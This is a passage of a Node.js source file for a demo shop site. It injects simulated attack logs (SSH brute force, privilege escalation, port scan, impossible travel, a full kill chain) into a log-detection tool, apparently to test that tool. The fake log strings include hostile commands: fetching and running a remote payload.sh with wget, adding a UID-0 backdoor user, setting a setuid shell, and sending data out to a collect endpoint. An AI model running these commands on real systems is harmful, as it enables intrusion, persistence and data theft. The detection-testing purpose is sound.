  const breachLine = `${syslogTimestamp(62)} ${domain} sshd[${10000 + Math.floor(Math.random()*50000)}]: Accepted password for root from ${ip} port 22 ssh2`;
  lines += breachLine + '\n';
  logLines.push(`[BREACH] ${breachLine}`);

  // Phase 4: Privilege escalation
  lines += `${syslogTimestamp(65)} ${domain} sudo[${Math.floor(Math.random()*50000)}]:  www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash\n`;
  logLines.push(`[ESCALATE] www-data → root shell`);

  // Phase 5: Persistence
  lines += `${syslogTimestamp(68)} ${domain} sudo[${Math.floor(Math.random()*50000)}]:  www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -o -u 0 backdoor\n`;
  lines += `${syslogTimestamp(70)} ${domain} sudo[${Math.floor(Math.random()*50000)}]:  www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab -e\n`;
  logLines.push(`[PERSIST] Backdoor user + cron job installed`);

  // Phase 6: Data exfiltration
  const exfilLine = `${syslogTimestamp(75)} ${domain} webapp[${20000 + Math.floor(Math.random()*30000)}]: DATA_EXFILTRATION from ${ip} destination=http://${ip}:9999/collect bytes_sent=15728640 records=45000`;
  lines += exfilLine + '\n';
  logLines.push(`[EXFIL] 45,000 records (15MB) exfiltrated to ${ip}`);

  sendToSentinel(lines, targetUrl);
  res.json({
    message: `Full kill chain executed against ${domain}: Recon → Brute Force → Breach → Escalate → Persist → Exfiltrate`,
    log_lines: logLines,
  });
});

// ── Legacy simulate page (kept for backward compat) ───────────────────────────

app.get('/simulate', (req, res) => {
  res.send(layout('Attack Simulator', `
    <div class="card">
      <h1>⚡ Legacy Simulator <span class="pill pill-orange">DEMO ONLY</span></h1>
      <p style="color:#64748b;margin-bottom:8px">
        Each button injects malicious log lines directly into Log Sentinel.
        <strong><a href="/attack" style="color:#fb7185">→ Try the new Attack page for URL targeting</a></strong>
      </p>
    </div>
    <div class="simulate-grid">
      <div class="sim-card">
        <h3>🔨 Brute Force SSH</h3>
        <p>35 failed login attempts from a Tor exit node IP in 90 seconds.</p>
        <button class="btn-red" onclick="simulate('brute-force')">Run Attack</button>
      </div>
      <div class="sim-card">
        <h3>🔐 Privilege Escalation</h3>
        <p>www-data runs sudo wget + useradd + chmod 4755 backdoor.</p>
        <button class="btn-orange" onclick="simulate('privesc')">Run Attack</button>
      </div>
      <div class="sim-card">
        <h3>🔍 Port Scan</h3>
        <p>20 different paths hit in rapid succession from a single IP.</p>
        <button class="btn-yellow" onclick="simulate('portscan')">Run Attack</button>
      </div>
      <div class="sim-card">
        <h3>🌍 Impossible Travel</h3>
        <p>Admin logs in from US, then Moscow 2 minutes later.</p>
        <button class="btn-violet" onclick="simulate('travel')">Run Attack</button>
      </div>
    </div>
    <div id="status"></div>
    <script>
      async function simulate(type) {
        const el = document.getElementById('status');
        el.textContent = '⏳ Sending attack logs...';
        try {
          const r = await fetch('/simulate/' + type, { method: 'POST' });
          const d = await r.json();
          el.textContent = '✅ ' + d.message;
        } catch(e) {
          el.textContent = '❌ Error: ' + e.message;
        }
      }
    </script>
  `));
});

// ── Legacy attack simulation endpoints ────────────────────────────────────────

app.post('/simulate/brute-force', (req, res) => {
  const ip = '185.220.101.34';
  let lines = buildSyslogBaseline();
  for (let i = 0; i < 35; i++) {
    lines += syslogFailed(ip, 'root', 22, i * 2);
  }
  lines += syslogAccepted(ip, 'root', 22, 72);
  sendToSentinel(lines);
  res.json({ message: '35 failed SSH logins injected from 185.220.101.34 — check Log Sentinel!' });
});

app.post('/simulate/privesc', (req, res) => {
  let lines = buildSyslogBaseline();
  lines += syslogAccepted('10.0.0.5', 'www-data', 4444, 0);
  lines += syslogSudo('www-data', '/usr/bin/wget http://185.220.101.1/payload.sh', 2);
  lines += syslogSudo('www-data', '/bin/bash /tmp/payload.sh', 4);
  lines += syslogSudo('www-data', '/usr/sbin/useradd -o -u 0 backdoor', 6);
  lines += syslogSudo('www-data', '/bin/chmod 4755 /tmp/shell', 8);
  lines += syslogSudo('www-data', '/usr/bin/crontab -e', 10);
  sendToSentinel(lines);
  res.json({ message: 'Privilege escalation sequence injected (www-data → root) — check Log Sentinel!' });
});

app.post('/simulate/portscan', (req, res) => {
  const ip = '45.33.32.156';
  let lines = buildSyslogBaseline();
  const ports = [21,23,25,80,443,8080,8443,3306,5432,6379,27017,9200,11211,2181,5000,6000,7000,8000,9000,10000];
  for (const port of ports) {
    lines += syslogFailed(ip, 'root', port, ports.indexOf(port));
  }
  sendToSentinel(lines);
  res.json({ message: '20-port scan injected from 45.33.32.156 — check Log Sentinel!' });
});

app.post('/simulate/travel', (req, res) => {
  let lines = buildSyslogBaseline();
  lines += syslogAccepted('72.21.198.66', 'admin', 443, 0);
  lines += syslogSession('opened', 'admin', 1);
  lines += syslogAccepted('95.173.136.70', 'admin', 443, 120);
  lines += syslogSession('opened', 'admin', 121);
  sendToSentinel(lines);
  res.json({ message: 'Impossible travel injected (US → Moscow in 2 min) — check Log Sentinel!' });
});

// ── Start ─────────────────────────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`\n🛒  ShopEase target site running at http://localhost:${PORT}`);
  console.log(`🎯  Attack Simulator:               http://localhost:${PORT}/attack`);
  console.log(`⚡  Legacy Simulator:               http://localhost:${PORT}/simulate`);
  console.log(`📡  Sending logs to:               ${LOG_SENTINEL_URL}\n`);
});
